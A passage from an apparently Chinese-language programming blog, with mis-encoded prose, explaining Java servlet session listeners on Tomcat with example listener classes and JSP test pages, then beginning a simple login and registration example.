se)</span> </span>&#123;</span><br><span class="line">        HttpSessionAttributeListener.<span class="keyword">super</span>.attributeReplaced(se);</span><br><span class="line">        <span class="keyword">if</span>(se.getName().equals(<span class="string">&quot;cant&quot;</span>))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;REPLACE -&gt; cant &quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;VALUE -&gt; &quot;</span> + se.getSession().getAttribute(se.getName()) + <span class="string">&quot; -&gt; &quot;</span> + se.getValue());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">attributeRemoved</span><span class="params">(HttpSessionBindingEvent se)</span> </span>&#123;</span><br><span class="line">        HttpSessionAttributeListener.<span class="keyword">super</span>.attributeRemoved(se);</span><br><span class="line">        <span class="keyword">if</span>(se.getName().equals(<span class="string">&quot;cant&quot;</span>))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;REMOVE -&gt; cant &quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;VALUE -&gt; &quot;</span> + se.getSession().getAttribute(se.getName()));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>æ‰“åŒ…æˆ <code>jar</code> æ”¾åˆ°å¯¹åº”çš„ç›®å½•ï¼Œæ¥ç€æ˜¯ <code>web.xml</code> å†…å®¹ğŸ‘‡</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>custom.sessionListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>æµ‹è¯•çš„ <code>listener2.jsp</code> æ–‡ä»¶å†…å®¹ğŸ‘‡</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;LISTENER2&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    session.setAttribute(<span class="string">&quot;can&quot;</span>,<span class="string">&quot;1&quot;</span>);</span><br><span class="line">    session.setAttribute(<span class="string">&quot;cant&quot;</span>,<span class="string">&quot;2&quot;</span>);</span><br><span class="line"></span><br><span class="line">    session.setAttribute(<span class="string">&quot;can&quot;</span>,<span class="string">&quot;2&quot;</span>);</span><br><span class="line">    session.setAttribute(<span class="string">&quot;cant&quot;</span>,<span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line">    session.removeAttribute(<span class="string">&quot;can&quot;</span>);</span><br><span class="line">    session.removeAttribute(<span class="string">&quot;cant&quot;</span>);</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°ç»“æœğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202241416963.png" alt="image-20220224141632790"></p>
<p>å¯è§åªè¦ <code>cant</code> è¢«æ›´æ”¹å°±ä¼šæœ‰æ“ä½œè®°å½•è¢«è¾“å‡ºï¼Œè€Œå¯¹ <code>remove</code> æ“ä½œç›‘å¬çš„æ–¹æ³•æ˜¯åœ¨åˆ é™¤æ“ä½œå®Œæˆåæ‰ä¼šè¢«æ‰§è¡Œçš„ã€‚</p>
<h5 id="ç»‘å®šåˆ°-HttpSession-åŸŸä¸­æŸä¸ªå¯¹è±¡çŠ¶æ€çš„äº‹ä»¶">- ç»‘å®šåˆ° <code>HttpSession</code> åŸŸä¸­æŸä¸ªå¯¹è±¡çŠ¶æ€çš„äº‹ä»¶ -</h5>
<p>åœ¨ <code>HttpSession</code> ä¸­å¯¹è±¡çš„çŠ¶æ€æœ‰ä¸¤ç§ğŸ‘‡</p>
<ul>
<li>ç»‘å®šä¸è§£é™¤ç»‘å®š</li>
<li>é’åŒ–ä¸æ´»åŒ–</li>
</ul>
<p>å…¶ä¸­ <code>ç»‘å®š</code> ä¸ <code>è§£é™¤ç»‘å®š</code> æ˜¯æŒ‡åœ¨ <code>HttpSession</code> ä¸­æŸä¸ªå¯¹è±¡è®¾ç½®ä¸ºå±æ€§å€¼æˆ–ç§»é™¤æŸä¸ªå±æ€§çš„å€¼ï¼Œè€Œ <code>é’åŒ–</code> æŒ‡çš„æ˜¯æœåŠ¡å™¨å°†ä¸å¸¸ç”¨çš„ <code>session</code> å¯¹è±¡æš‚æ—¶åºåˆ—åŒ–æ”¾åˆ°ç³»ç»Ÿæ–‡ä»¶æˆ–æ•°æ®åº“ä¸­ï¼Œä¸ <code>é’åŒ–</code> ç›¸åï¼Œ<code>æ´»åŒ–</code> æ˜¯å°†æš‚å­˜åœ¨ç³»ç»Ÿæ–‡ä»¶æˆ–æ•°æ®åº“ä¸­çš„ <code>session</code> å¯¹è±¡ååºåˆ—åŒ–åˆ°æœåŠ¡å™¨ä¸­ã€‚å½“ <code>tomcat</code> æœåŠ¡å™¨è¢«å…³é—­ã€é‡å¯æ—¶æˆ–æ˜¯é‡æ–°åŠ è½½æ—¶ï¼Œéƒ½ä¼šå°† <code>session</code> å¯¹è±¡é’åŒ–åˆ°æœåŠ¡å™¨çš„æ–‡ä»¶ç³»ç»Ÿä¸­ã€‚</p>
<p>é’ˆå¯¹ <code>ç»‘å®š</code> ä¸ <code>è§£é™¤ç»‘å®š</code> çš„ç›‘å¬å™¨ï¼Œå¾—ç»§æ‰¿ <code>HttpSessionBindingListener</code> ç±»ï¼Œè€Œé’ˆå¯¹ <code>é’åŒ–</code> ä¸ <code>æ´»åŒ–</code> çš„ç›‘å¬å™¨åˆ™éœ€è¦ç»§æ‰¿ <code>HttpSessionActivationListener</code> ç±»ã€‚</p>
<p>è¿™ç§ <code>ç»‘å®šå¯¹è±¡</code> çš„ç›‘å¬å™¨å’Œä¸Šé¢ä¸ <code>è®¾ç½®å±æ€§</code> çš„ç›‘å¬å™¨çš„åŒºåˆ«åœ¨äº <code>ç»‘å®šå¯¹è±¡</code> çš„ç›‘å¬å™¨åªç›‘å¬æŸç§ç±»å‹å¯¹è±¡çš„ç»‘å®šä¸è§£é™¤ç»‘å®šæ“ä½œï¼Œè€Œ <code>è®¾ç½®å±æ€§</code> çš„ç›‘å¬å™¨æ‰€ç›‘å¬çš„æ˜¯æ‰€æœ‰è®¾ç½®å±æ€§çš„æ“ä½œã€‚</p>
<p>æ¯”æ–¹è¯´å…ˆå†™ä¸€ä¸ª <code>ç»‘å®š</code> ä¸ <code>è§£é™¤ç»‘å®š</code> çš„ç›‘å¬å™¨ï¼Œä¸ºå®ç°åœ¨å¯¹ <code>X</code> ç±»ç±»å‹çš„å€¼è¿›è¡Œ <code>ç»‘å®š</code> å’Œ <code>è§£é™¤ç»‘å®š</code> æ—¶è¾“å‡ºç‰¹å®šå±æ€§ï¼Œç›‘å¬å™¨ä»£ç ğŸ‘‡</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> custom;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpSessionBindingEvent;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpSessionBindingListener;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">X</span> <span class="keyword">implements</span> <span class="title">HttpSessionBindingListener</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String a;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String b;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">X</span><span class="params">(String start, String end)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.a = start;</span><br><span class="line">        <span class="keyword">this</span>.b = end;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">valueBound</span><span class="params">(HttpSessionBindingEvent event)</span> </span>&#123;</span><br><span class="line">        HttpSessionBindingListener.<span class="keyword">super</span>.valueBound(event);</span><br><span class="line">        System.out.println(<span class="string">&quot;a -&gt; &quot;</span> + <span class="keyword">this</span>.a);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">valueUnbound</span><span class="params">(HttpSessionBindingEvent event)</span> </span>&#123;</span><br><span class="line">        HttpSessionBindingListener.<span class="keyword">super</span>.valueUnbound(event);</span><br><span class="line">        System.out.println(<span class="string">&quot;b -&gt; &quot;</span> + <span class="keyword">this</span>.b);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å°†å…¶æ‰“åŒ…æˆ <code>jar</code> åæ”¾åœ¨ç›¸åº”ç›®å½•å³å¯ï¼Œä¸éœ€è¦æ”¹ <code>web.xml</code> çš„å†…å®¹ã€‚</p>
<p>ç„¶åæ˜¯ <code>x.jsp</code> æ–‡ä»¶å†…å®¹ğŸ‘‡</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;custom.X&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;X&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    X x = <span class="keyword">new</span> X(<span class="string">&quot;start&quot;</span>,<span class="string">&quot;end&quot;</span>);</span><br><span class="line"></span><br><span class="line">    session.setAttribute(<span class="string">&quot;x&quot;</span>,x);</span><br><span class="line">    session.setAttribute(<span class="string">&quot;s&quot;</span>,<span class="string">&quot;123&quot;</span>);</span><br><span class="line"></span><br><span class="line">    session.removeAttribute(<span class="string">&quot;s&quot;</span>);</span><br><span class="line">    session.removeAttribute(<span class="string">&quot;x&quot;</span>);</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°ç»“æœğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202241450737.png" alt="image-20220224145045586"></p>
<p>å¯è§åªæœ‰ <code>X</code> ç±»ç±»å‹çš„å˜é‡å½“è¢«è£…å…¥ <code>session</code> æˆ–ä» <code>session</code> ä¸­åˆ é™¤æ—¶æ‰ä¼šè§¦å‘ <code>ç»‘å®š</code> ä¸ <code>è§£é™¤ç»‘å®š</code> çš„ç›‘å¬å™¨ï¼Œå¦‚æœå†åˆ©ç”¨ä¸Šé¢æœ‰å…³ <code>HttpSession</code> å¢åˆ æ”¹çš„ç›‘å¬å™¨ï¼Œå°† <code>x,jsp</code> å†…å®¹æ”¹ä¸ºä»¥ä¸‹å€¼ğŸ‘‡</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;custom.X&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;X&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    X x = <span class="keyword">new</span> X(<span class="string">&quot;start&quot;</span>,<span class="string">&quot;end&quot;</span>);</span><br><span class="line"></span><br><span class="line">    session.setAttribute(<span class="string">&quot;cant&quot;</span>,x);</span><br><span class="line">    session.setAttribute(<span class="string">&quot;s&quot;</span>,<span class="string">&quot;123&quot;</span>);</span><br><span class="line"></span><br><span class="line">    session.setAttribute(<span class="string">&quot;cant&quot;</span>,x);</span><br><span class="line"></span><br><span class="line">    session.removeAttribute(<span class="string">&quot;s&quot;</span>);</span><br><span class="line">    session.removeAttribute(<span class="string">&quot;cant&quot;</span>);</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°ç»“æœğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202241456425.png" alt="image-20220224145615268"></p>
<p>å¯è§æœ‰å…³ <code>ç»‘å®š</code> å’Œ <code>è§£é™¤ç»‘å®š</code> çš„ç›‘å¬å™¨æ˜¯åœ¨ä¸Šé¢æœ‰å…³ <code>HttpSession</code> å¢åˆ æ”¹çš„ç›‘å¬å™¨å‰çš„ï¼Œä¹Ÿå°±æ˜¯è¯´å½“æŒ‡å®šç±»å‹çš„ç±»å®ä¾‹è¢«æ”¾å…¥ <code>session</code> ä¸­è¿™ä¸ªæ“ä½œè¢«æ‰§è¡Œå‰ <code>ç»‘å®š</code> å’Œ <code>è§£é™¤ç»‘å®š</code> çš„ç›‘å¬å™¨å°±å·²ç»ç›‘å¬åˆ°äº†ï¼Œè€Œåœ¨æŒ‡å®šç±»å‹çš„ç±»å®ä¾‹åœ¨è¢« <code>session</code> æ‰§è¡Œåˆ é™¤æ“ä½œå‰ <code>ç»‘å®š</code> å’Œ <code>è§£é™¤ç»‘å®š</code> çš„ç›‘å¬å™¨ä¹Ÿèƒ½ç›‘å¬åˆ°ã€‚</p>
<p>ç¬¬äºŒä¸ªæ˜¯ <code>é’åŒ–</code> ä¸ <code>æ´»åŒ–</code> ç›‘å¬å™¨ï¼Œå®ç°åœ¨æœåŠ¡å™¨å¯¹ <code>Y</code> ç±»ç±»å‹çš„å€¼è¿›è¡Œ <code>é’åŒ–</code> å’Œ <code>æ´»åŒ–</code> æ—¶è¾“å‡ºç‰¹å®šçš„å±æ€§å€¼ï¼Œå…ˆæ˜¯ç›‘å¬å™¨ä»£ç ğŸ‘‡</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> custom;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpSessionActivationListener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpSessionEvent;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Y</span> <span class="keyword">implements</span> <span class="title">HttpSessionActivationListener</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String a;</span><br><span class="line">    <span class="keyword">public</span> String b;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Y</span><span class="params">(String start, String end)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.a = start;</span><br><span class="line">        <span class="keyword">this</span>.b = end;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Y</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sessionDidActivate</span><span class="params">(HttpSessionEvent se)</span> </span>&#123;</span><br><span class="line">        HttpSessionActivationListener.<span class="keyword">super</span>.sessionDidActivate(se);</span><br><span class="line">        System.out.println(<span class="string">&quot;a -&gt; &quot;</span> + <span class="keyword">this</span>.a);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sessionWillPassivate</span><span class="params">(HttpSessionEvent se)</span> </span>&#123;</span><br><span class="line">        HttpSessionActivationListener.<span class="keyword">super</span>.sessionWillPassivate(se);</span><br><span class="line">        System.out.println(<span class="string">&quot;b -&gt; &quot;</span> + <span class="keyword">this</span>.b);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å°†å…¶æ‰“åŒ…æˆ <code>jar</code> æ”¾åˆ°å¯¹åº”ç›®å½•åï¼Œåœ¨ <code>web.xml</code> å†™å…¥ä»¥ä¸‹å†…å®¹ğŸ‘‡</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>custom.Y<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>ç„¶åæ˜¯ <code>y.jsp</code> æ–‡ä»¶å†…å®¹ğŸ‘‡</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;custom.Y&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Y&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    Y y = <span class="keyword">new</span> Y(<span class="string">&quot;æ´»åŒ–&quot;</span>,<span class="string">&quot;é’åŒ–&quot;</span>);</span><br><span class="line">    session.setAttribute(<span class="string">&quot;x&quot;</span>,y);</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>å…ˆè®¿é—® <code>y.jsp</code> ï¼Œå†å…³é—­æœåŠ¡å™¨å¾—åˆ°ä»¥ä¸‹ç»“æœğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202241510017.png" alt="image-20220224151033908"></p>
<p>ç”±äºè¿™é‡Œç”¨çš„æ˜¯ <code>IntelliJ IDEA</code> é…åˆ <code>tomcat</code> æ¯æ¬¡å…³é—­æœåŠ¡å™¨éƒ½ä¼šå°†ä¸´æ—¶é…ç½®æ–‡ä»¶æ¸…ç©ºï¼Œæ‰€ä»¥åº”è¯¥æ˜¯åœ¨å¯åŠ¨æœåŠ¡å™¨æ—¶æ²¡èƒ½æ˜¾ç¤º <code>a -&gt; æ´»åŒ–</code> çš„åŸå› ã€‚</p>
<h3 id="å…¶ä»–">- å…¶ä»– -</h3>
<p>éšä¾¿å†™å†™å‡ ä¸ªä¾‹å­åŠ æ·±ä¸‹å°è±¡ã€‚</p>
<h4 id="ç”¨æˆ·ç®¡ç†å®ä¾‹">- ç”¨æˆ·ç®¡ç†å®ä¾‹ -</h4>
<h5 id="è¦æ±‚">- è¦æ±‚ -</h5>
<p>ç®€å•å®ç° <code>ç”¨æˆ·æ³¨å†Œ</code>ï¼Œ <code>ç”¨æˆ·ç™»å½•</code> ï¼Œ<code>ç”¨æˆ·ç™»å‡º</code> ã€‚</p>
<h5 id="å®ç°">- å®ç° -</h5>
<p>å…ˆéšä¾¿å»ºä¸ªè¡¨ğŸ‘‡</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">desc</span> user.userInfo;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+--------------+------+-----+---------+-------+</span></span><br><span class="line"><span class="operator">|</span> Field    <span class="operator">|</span> Type         <span class="operator">|</span> <span class="keyword">Null</span> <span class="operator">|</span> Key <span class="operator">|</span> <span class="keyword">Default</span> <span class="operator">|</span> Extra <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+--------------+------+-----+---------+-------+</span></span><br><span class="line"><span class="operator">|</span> username <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">255</span>) <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> password <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">32</span>)  <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+--------------+------+-----+---------+-------+</span></span><br><span class="line"><span class="number">2</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
<p>ç™»å½•é¡µé¢ <code>login.jsp</code> ğŸ‘‡</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Login&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;core&quot;</span> target=<span class="string">&quot;_self&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">    &lt;input hidden=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;action&quot;</span> value=<span class="string">&quot;login&quot;</span>/&gt;</span><br><span class="line">    &lt;p&gt; ç”¨æˆ·å &lt;/p&gt;&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span>/&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;p&gt;å¯† ç &lt;/p&gt;&lt;/p&gt;&lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password&quot;</span>/&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;ç™»å½•&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;a href=<span class="string">&quot;register.jsp&quot;</span>&gt;æ³¨å†Œ&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>æ³¨å†Œé¡µé¢ <code>register.jsp</code> ğŸ‘‡</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Register&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;core&quot;</span> target=<span class="string">&quot;_self&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">    &lt;input hidden=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;action&quot;</span> value=<span class="string">&quot;register&quot;</span>/&gt;</span><br><span class="line">    &lt;p&gt;ç”¨æˆ·å&lt;/p&gt;&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span>/&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;p&gt;å¯† ç &lt;/p&gt;&lt;/p&gt;&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;password&quot;</span>/&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;p&gt;é‡å¤å¯†ç &lt;/p&gt;&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;repassword&quot;</span>/&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;æ³¨å†Œ&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;a href=<span class="string">&quot;login.jsp&quot;</span>&gt;ç™»å½•&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span 